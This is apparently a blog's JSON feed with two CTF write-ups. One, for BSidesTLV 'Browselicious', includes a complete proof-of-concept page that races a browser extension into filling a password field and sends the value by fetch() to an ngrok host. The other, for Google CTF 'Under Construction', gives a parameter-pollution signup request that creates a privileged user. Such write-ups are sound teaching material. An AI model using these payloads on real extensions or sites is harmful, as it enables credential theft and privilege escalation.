{"version":"https://jsonfeed.org/version/1.1","title":"./khatta.sh","home_page_url":"https://blog.shameerkashif.me","feed_url":"https://blog.shameerkashif.me/feed.json","description":"Khatta is a knowledge base and is created to provide in depth articles regarding tech, CTFs, challenges and much more.","icon":"https://blog.shameerkashif.me/assets/any@512.png","favicon":"https://blog.shameerkashif.me/favicon.png","authors":[{"name":"@hash3liZer","url":"https://blog.shameerkashif.me","avatar":"/assets/avatar.png"}],"language":"zh","hubs":[{"type":"WebSub","url":"https://pubsubhubbub.appspot.com"},{"type":"WebSub","url":"https://bridgy-fed.superfeedr.com"}],"items":[{"id":"blog/2023/writeup-browselicious-challenge-bsidestlv-ctf","url":"https://blog.shameerkashif.me/blog/2023/writeup-browselicious-challenge-bsidestlv-ctf","title":"BSidesTLV CTF 2023 Browselicious (Misc) Writeup","content_html":"<h1 id=\"introducton\"><a href=\"#introducton\">Introducton</a></h1><p>This writeup is for the <strong>Browselicious</strong> challenge from <strong>Misc</strong> category in BSidesTLV CTF held online. The challenge had an external link and a <code>js</code> file that contained browser extension code. The external link was a simple website that had a URL Input field. The URL was probably being processed in a browser on the backend with the extension installed.</p><p>To complete the challenge, one had to create a document with a <code>input[type=&quot;password&quot;]</code> field and capture the value of this field when populated by the extension itself. But also, we needed to exploit a race condition here by doing a <code>postMessage</code> before the extension itself.</p><h1 id=\"writeup\"><a href=\"#writeup\">Writeup</a></h1><h3 id=\"server-request\"><a href=\"#server-request\">Server Request</a></h3><p>Right after i visited the page, it said <em>Our Extension is coming soon</em> and there was an input field that accepted a URL. So, right away i fired up <code>ngrok</code> without actually running anything for the proxy and checked if i received anything back.</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>$ ngrok http 8000</div></code></div></pre><!-- HTML_TAG_END --><p>And i got requests back on terminal.</p><img width=\"946\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta/assets/29171692/ba40787f-c811-46ec-93a5-1a67298d9a28\"><h3 id=\"code-review\"><a href=\"#code-review\">Code Review</a></h3><p>Then i opened the <code>js</code> file and the code has 2 main events: <code>onMessage</code> and <code>onLoad</code>. The first event checks for a couple conditions and populates data in the <code>input[type=&quot;password&quot;]</code> field. The second event simply fires a <code>postMessage</code> to the current window with some data. </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>// Listen for messages from the extension</div><div class='line'>window.addEventListener(\"message\", function (event) &#123;</div><div class='line'>    // Check if the message is from the extension</div><div class='line'>    if (event.source === window && event.data.action === \"populatePassword\") &#123;</div><div class='line'>        // Find the password input field</div><div class='line'>        var passwordField = document.querySelector('input[type=\"password\"]');</div><div class='line'></div><div class='line'>        // Populate the password field with the specified string</div><div class='line'>        if (passwordField) &#123;</div><div class='line'>            passwordField.value = (event.data.url === \"http://flag\") ? \"BSidevTLV2023&#123;TheFlag&#125;\" : \"MyDefaultPassword\";</div><div class='line'>        &#125;</div><div class='line'>    &#125;</div><div class='line'>&#125;);</div><div class='line'></div><div class='line'>// Send a message to populate the password field on page load</div><div class='line'>window.addEventListener(\"load\", function () &#123;</div><div class='line'>    window.postMessage(&#123;</div><div class='line'>        action: \"populatePassword\",</div><div class='line'>        url: window.location.href,</div><div class='line'>        password: \"YourPassword\" // Replace with the desired password</div><div class='line'>    &#125;, \"*\");</div><div class='line'>&#125;);</div></code></div></pre><!-- HTML_TAG_END --><h3 id=\"exploit\"><a href=\"#exploit\">Exploit</a></h3><p>To exploit the challenge, we need to implement 3 things in the PoC:</p><ul><li>Create a web page with <code>input[type=&quot;password&quot;]</code> form field which will accept the data.</li><li>Exploit the Race condition by setting an interval in <em>milliseconds</em>.</li><li>In the <code>postMessage</code>, set the value of <code>url</code> to <code>http://flag</code>.</li></ul><p>Before we head to the exploit work, setup a <code>python</code> file to act as our server: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>import http.server</div><div class='line'>import socketserver</div><div class='line'></div><div class='line'>PORT = 8000</div><div class='line'></div><div class='line'>html_content = r'''</div><div class='line'>PAYLOAD HERE</div><div class='line'>'''</div><div class='line'></div><div class='line'># Request Handler</div><div class='line'>class MyHandler(http.server.BaseHTTPRequestHandler):</div><div class='line'>    def do_GET(self):</div><div class='line'>        self.send_response(200)</div><div class='line'>        self.send_header('Content-type', 'text/html')</div><div class='line'>        self.end_headers()</div><div class='line'>        self.wfile.write(html_content.encode('utf-8'))</div><div class='line'></div><div class='line'>with socketserver.TCPServer((\"0.0.0.0\", PORT), MyHandler) as httpd:</div><div class='line'>    print(f\"Serving at port &#123;PORT&#125;\")</div><div class='line'>    httpd.serve_forever()</div></code></div></pre><!-- HTML_TAG_END --><h4 id=\"input-field\"><a href=\"#input-field\">Input Field</a></h4><p>Put together an html code that as input field: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" html=\"true\"><div class=\"language-id\">html</div><div class='code-container'><code><div class='line'>&lt;!DOCTYPE html&gt;</div><div class='line'>&lt;html lang=\"en\"&gt;</div><div class='line'>&lt;head&gt;</div><div class='line'>    &lt;meta charset=\"utf-8\" /&gt;</div><div class='line'>    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" /&gt;</div><div class='line'>    &lt;title&gt;POC Vulnerable website&lt;/title&gt;</div><div class='line'>&lt;/head&gt;</div><div class='line'>&lt;body&gt;</div><div class='line'>    &lt;form&gt;</div><div class='line'>        &lt;input type=\"password\"&gt;&lt;/input&gt;</div><div class='line'>        &lt;script&gt;</div><div class='line'>          window.addEventListener('load', () =&gt; &#123;</div><div class='line'>                let elem = document.querySelector(\"input\");</div><div class='line'>                if(elem.value)&#123;</div><div class='line'>                    fetch(\"https://f5d4-101-50-76-194.ngrok-free.app/?value=\" + (elem.value || \"nothing\"));</div><div class='line'>                &#125;</div><div class='line'>            &#125;);</div><div class='line'>        &lt;/script&gt;</div><div class='line'>    &lt;/form&gt;</div><div class='line'>&lt;/body&gt;</div><div class='line'>&lt;/html&gt;</div></code></div></pre><!-- HTML_TAG_END --><p>I fired up this python server, proxied through ngrok:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>$ python3 poc.py</div></code></div></pre><!-- HTML_TAG_END --><p>Got, the following result:</p><img width=\"946\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta/assets/29171692/d267f5fa-f46e-4443-b43e-64f354a443dc\"><h4 id=\"race-condition\"><a href=\"#race-condition\">Race Condition</a></h4><p>To exploit the race condition, i simply replaced the <code>addEventListener</code> with <code>setInterval</code> having <code>20ms</code>. </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>setInterval(() =&gt; &#123;</div><div class='line'>  let elem = document.querySelector(\"input\");</div><div class='line'>  if(elem.value)&#123;</div><div class='line'>      fetch(\"https://f5d4-101-50-76-194.ngrok-free.app/?value=\" + (elem.value || \"nothing\"));</div><div class='line'>  &#125;</div><div class='line'>&#125;, 20);</div></code></div></pre><!-- HTML_TAG_END --><h4 id=\"post-message\"><a href=\"#post-message\">Post Message</a></h4><p>Now, simply put the <code>postMessage</code> inside the callback function: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>setInterval(() =&gt; &#123;</div><div class='line'>  window.postMessage(&#123;</div><div class='line'>      action: \"populatePassword\",</div><div class='line'>      url: \"http://flag\",</div><div class='line'>      password: \"YourPassword\" // Replace with the desired password</div><div class='line'>  &#125;, \"*\");</div><div class='line'></div><div class='line'>  let elem = document.querySelector(\"input\");</div><div class='line'>  if(elem.value)&#123;</div><div class='line'>      fetch(\"https://f5d4-101-50-76-194.ngrok-free.app/?value=\" + (elem.value || \"nothing\"));</div><div class='line'>  &#125;</div><div class='line'>&#125;, 20);</div></code></div></pre><!-- HTML_TAG_END --><p>This time i fired up the server and got the flag:</p><img width=\"946\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta/assets/29171692/aaa3fa1b-1c7b-45d4-9745-4464d6dd1f4f\"><h2 id=\"poc\"><a href=\"#poc\">PoC</a></h2><p>The complete Proof of Concept:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>import http.server</div><div class='line'>import socketserver</div><div class='line'></div><div class='line'>PORT = 8000</div><div class='line'></div><div class='line'>html_content = r\"\"\"</div><div class='line'>&lt;!DOCTYPE html&gt;</div><div class='line'>&lt;html lang=\"en\"&gt;</div><div class='line'>&lt;head&gt;</div><div class='line'>    &lt;meta charset=\"utf-8\" /&gt;</div><div class='line'>    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" /&gt;</div><div class='line'>    &lt;title&gt;POC Vulnerable website&lt;/title&gt;</div><div class='line'>&lt;/head&gt;</div><div class='line'>&lt;body&gt;</div><div class='line'>    &lt;form&gt;</div><div class='line'>        &lt;input type=\"password\"&gt;&lt;/input&gt;</div><div class='line'>    &lt;/form&gt;</div><div class='line'>    &lt;script&gt;</div><div class='line'>            setInterval(() =&gt; &#123;</div><div class='line'>                window.postMessage(&#123;</div><div class='line'>                    action: \"populatePassword\",</div><div class='line'>                    url: \"http://flag\",</div><div class='line'>                    password: \"YourPassword\" // Replace with the desired password</div><div class='line'>                &#125;, \"*\");</div><div class='line'></div><div class='line'>                let elem = document.querySelector(\"input\");</div><div class='line'>                if(elem.value)&#123;</div><div class='line'>                    fetch(\"https://f5d4-101-50-76-194.ngrok-free.app/?value=\" + (elem.value || \"nothing\"));</div><div class='line'>                &#125;</div><div class='line'>            &#125;, 20);</div><div class='line'>    &lt;/script&gt;</div><div class='line'>&lt;/body&gt;</div><div class='line'>&lt;/html&gt;</div><div class='line'>\"\"\"</div><div class='line'></div><div class='line'>class MyHandler(http.server.BaseHTTPRequestHandler):</div><div class='line'>    def do_GET(self):</div><div class='line'>        self.send_response(200)</div><div class='line'>        self.send_header('Content-type', 'text/html')</div><div class='line'>        self.end_headers()</div><div class='line'>        self.wfile.write(html_content.encode('utf-8'))</div><div class='line'></div><div class='line'>with socketserver.TCPServer((\"0.0.0.0\", PORT), MyHandler) as httpd:</div><div class='line'>    print(f\"Serving at port &#123;PORT&#125;\")</div><div class='line'>    httpd.serve_forever()</div></code></div></pre><!-- HTML_TAG_END -->","summary":"Writeup for Browselicious challenge (Misc) from BsidesTLV CTF 2023","image":"https://github.com/hash3liZer/khatta/assets/29171692/1788ec87-fc59-49a7-a035-ec767504fb3d","date_published":"2023-06-28T00:00:00.000Z","date_modified":"2023-06-28T19:39:39.543Z","tags":["ctf","writeups","bsidestlv-ctf-2023"],"_indieweb":{"type":"article"}},{"id":"blog/2023/writeup-under-construction-google-ctf-2023","url":"https://blog.shameerkashif.me/blog/2023/writeup-under-construction-google-ctf-2023","title":"Google CTF 2023 Under Construction (Web) Writeup","content_html":"<h1 id=\"introduction\"><a href=\"#introduction\">Introduction</a></h1><p>This writeup is for the under construction challenge from web category in Google CTF 2023. The challenge was provided with the following statement: <em>“We were building a web app but the new CEO wants it remade in php.”</em></p><p>The challenge contained 2 different web apps. One was in PHP that seems to be under development whilst flask app seemed like a full application. This writeup covers an <code>Parameter Pollution</code> vulnerability we were able to create an escalated user by supplying more than 1 parameter. </p><h1 id=\"writeup\"><a href=\"#writeup\">Writeup</a></h1><h2 id=\"getting-started\"><a href=\"#getting-started\">Getting Started</a></h2><p>So, at first i visited the URLS and got to know the application surface. Then i downloaded the challenge files available and opened them in the editor. </p><p>Reading the code, i got to the <code>flag</code> point. In the <code>index.php</code> file, we have: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" php=\"true\"><div class=\"language-id\">php</div><div class='code-container'><code><div class='line'>...</div><div class='line'>if ($tier === NULL) &#123;</div><div class='line'>    return \"Invalid credentials\";</div><div class='line'>&#125;</div><div class='line'></div><div class='line'>$response = \"Login successful. Welcome \" . htmlspecialchars($username) . \".\";</div><div class='line'></div><div class='line'>// Look at this part. </div><div class='line'>if ($tier === \"gold\") &#123;</div><div class='line'>    $response .= \" \" . getenv(\"FLAG\");</div><div class='line'>&#125;</div><div class='line'></div><div class='line'>return $response;</div><div class='line'></div><div class='line'>...</div></code></div></pre><!-- HTML_TAG_END --><p>So, in order to get the flag, we need to create a gold tier user first. The PHP application itself doesn’t offer any signup functionlaity but the <code>account_migrator.php</code> file does that is being called from the flask application. So, if we look at the flask application, we will find where the user is being registered. </p><h2 id=\"vulnerable-part\"><a href=\"#vulnerable-part\">Vulnerable Part</a></h2><p>In the <code>authorized_routes.py</code>, we have: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>...</div><div class='line'>@authorized.route('/signup', methods=['POST'])</div><div class='line'>def signup_post():</div><div class='line'>  ...</div><div class='line'>  tier = models.Tier(request.form.get('tier'))</div><div class='line'></div><div class='line'>  if(tier == models.Tier.GOLD):</div><div class='line'>      flash('GOLD tier only allowed for the CEO')</div><div class='line'>      return redirect(url_for('authorized.signup'))  # Validation is based on first parameter</div><div class='line'>  ...</div><div class='line'></div><div class='line'>  new_user = models.User(username=username, </div><div class='line'>  password=generate_password_hash(password, method='sha256'), tier=tier.name)</div><div class='line'>  </div><div class='line'>  db.session.add(new_user)</div><div class='line'>  db.session.commit()</div><div class='line'>  </div><div class='line'>  requests.post(f\"http://&#123;PHP_HOST&#125;:1337/account_migrator.php\", </div><div class='line'>      headers=&#123;\"token\": TOKEN, \"content-type\": request.headers.get(\"content-type\")&#125;, data=raw_request) # Vulnerable PART</div><div class='line'>  return redirect(url_for('authorized.login'))</div></code></div></pre><!-- HTML_TAG_END --><p>The validation is based on the statement: <code>request.form.get(&#39;tier&#39;)</code>. This will always pick the first parameter if multiple parameters are to be supplied. However, the application is passing the <code>raw_request</code> as it is to the next application which is in PHP. </p><p>Take the following example:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'># Flask</div><div class='line'>curl https://vulnerablepart.com?tier=gold&tier=blue</div><div class='line'># you will the first parameter aka gold.</div><div class='line'></div><div class='line'># PHP</div><div class='line'>curl http://vulnerablepart.com?tier=gold&tier=bold</div><div class='line'># you will get the second parameter aka bold</div></code></div></pre><!-- HTML_TAG_END --><h2 id=\"exploit\"><a href=\"#exploit\">Exploit</a></h2><p>In order to exploit this, we needed to create the user normally but with extra argument containing <code>gold</code> value. I simply signed up with the following request in Burp: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>POST /signup HTTP/2</div><div class='line'>Host: under-construction-web.2023.ctfcompetition.com</div><div class='line'>Upgrade-Insecure-Requests: 1</div><div class='line'>Origin: https://under-construction-web.2023.ctfcompetition.com</div><div class='line'>Content-Type: application/x-www-form-urlencoded</div><div class='line'>User-Agent: &lt;Redacted&gt;</div><div class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</div><div class='line'></div><div class='line'>username=hash3liZer&password=password&tier=blue&tier=gold</div></code></div></pre><!-- HTML_TAG_END --><p>And it took me back to login page to signin:</p><img width=\"962\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta.sh/assets/29171692/e898c72f-b040-49d5-8f1b-4d07b40c24b3\"><p>So, i went to the PHP application and logged in and got the flag:</p><img width=\"1440\" alt=\"image\" src=\"https://github.com/hash3liZer/khatta.sh/assets/29171692/c6f61468-a875-4656-bd77-7c63190ee67f\"><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>CTF&#123;ff79e2741f21abd77dc48f17bab64c3d&#125;</div></code></div></pre><!-- HTML_TAG_END -->","summary":"Writeup for under construction challenge from google ctf 2023","image":"https://github.com/hash3liZer/khatta.sh/assets/29171692/f553635d-6deb-43e5-a2ae-0d8cef296db7","date_published":"2023-06-27T00:00:00.000Z","date_modified":"2023-06-28T19:39:39.543Z","tags":["ctf","writeups","google-ctf-2023"],"_indieweb":{"type":"article"}}]}